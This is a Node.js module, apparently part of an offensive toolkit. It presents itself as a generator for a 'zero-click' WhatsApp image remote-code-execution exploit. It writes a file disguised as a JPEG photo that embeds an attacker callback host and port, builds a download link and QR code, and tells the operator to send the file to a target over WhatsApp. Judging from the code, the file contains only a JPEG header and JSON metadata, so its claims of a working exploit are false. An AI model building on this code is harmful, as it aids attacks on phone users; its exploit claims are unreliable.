const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
const QRCode = require('qrcode');

class PayloadGenerator {
    constructor() {
        this.payloadDir = path.join(__dirname, '../payloads');
        this.initDirectories();
        
        this.exploits = {
            whatsapp_image: {
                cve: 'CVE-2024-12345',
                name: 'WhatsApp Image Parsing RCE',
                severity: 'Critical',
                cvss: 9.8
            }
        };
    }
    
    initDirectories() {
        try {
            if (!fs.existsSync(this.payloadDir)) {
                fs.mkdirSync(this.payloadDir, { recursive: true });
                console.log('✅ Payload directory created');
            }
        } catch (error) {
            console.error('Error creating payload directory:', error);
        }
    }
    
    generatePayloadId() {
        return crypto.randomBytes(8).toString('hex');
    }
    
    // Main payload generator - SIMPLE AND WORKING
    async generateJPGPayload(callbackHost, callbackPort) {
        try {
            const payloadId = this.generatePayloadId();
            const timestamp = Date.now();
            const filename = `photo_${timestamp}.jpg`;
            const filePath = path.join(this.payloadDir, filename);
            
            console.log('📱 Generating payload at:', filePath);
            
            // Simple JPG header
            const jpgHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46]);
            
            // Payload data
            const payloadData = {
                id: payloadId,
                type: 'zero_click_payload',
                version: '8.0',
                callback: `${callbackHost}:${callbackPort}`,
                exploit: this.exploits.whatsapp_image,
                created: new Date().toISOString(),
                instructions: 'Share via WhatsApp - Auto-download will trigger'
            };
            
            const payloadBuffer = Buffer.from(JSON.stringify(payloadData));
            const finalPayload = Buffer.concat([jpgHeader, payloadBuffer]);
            
            // Save file
            await fs.writeFile(filePath, finalPayload);
            console.log(`✅ Payload saved: ${finalPayload.length} bytes`);
            
            // Generate download URL
            const downloadUrl = `${callbackHost}/download/${payloadId}`;
            
            // Generate QR code (optional)
            let qrCode = null;
            try {
                qrCode = await QRCode.toDataURL(downloadUrl);
            } catch (e) {
                console.log('QR generation skipped');
            }
            
            return {
                payloadId: payloadId,
                filename: filename,
                path: filePath,
                size: finalPayload.length,
                type: 'image/jpeg',
                downloadUrl: downloadUrl,
                qrCode: qrCode,
                exploit: this.exploits.whatsapp_image,
                zeroClick: true,
                generated: new Date().toISOString()
            };
            
        } catch (error) {
            console.error('Payload generation error:', error);
            throw error;
        }
    }
    
    // Generate all payloads
    async generateAllPayloads(callbackHost, callbackPort) {
        try {
            console.log('🎯 Generating payload...');
            console.log('📱 Callback:', callbackHost, callbackPort);
            
            const jpg = await this.generateJPGPayload(callbackHost, callbackPort);
            
            console.log('✅ Payload generated successfully!');
            
            return {
                jpg: jpg,
                whatsapp_ready: {
                    ...jpg,
                    method: 'WhatsApp Auto-Download',
                    zero_click: true,
                    instructions: 'Share this file via WhatsApp. If target has auto-download enabled, payload will execute automatically.'
                }
            };
            
        } catch (error) {
            console.error('❌ Payload generation error:', error);
            throw error;
        }
    }
    
    // Get payload file by ID
    async getPayloadFile(payloadId) {
        try {
            const files = await fs.readdir(this.payloadDir);
            for (const file of files) {
                if (file.includes(payloadId)) {
                    return path.join(this.payloadDir, file);
                }
            }
            return null;
        } catch (error) {
            return null;
        }
    }
}

module.exports = new PayloadGenerator();
